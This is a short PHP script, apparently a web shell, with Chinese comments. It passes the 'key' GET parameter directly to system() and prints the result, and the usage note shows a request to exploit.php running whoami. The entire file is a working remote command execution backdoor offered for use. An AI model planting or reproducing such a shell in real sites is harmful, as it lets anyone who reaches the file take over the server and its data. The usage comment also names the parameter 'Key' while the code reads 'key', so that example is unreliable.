<?php
// 命令执行
echo system($_GET['key']);

/*
用法：
发送一个 HTTP GET 请求到该 PHP 脚本，并通过 "Key" 参数传递系统命令。
例如：
GET /example/exploit.php?Key=whoami HTTP/1.1
*/
?>
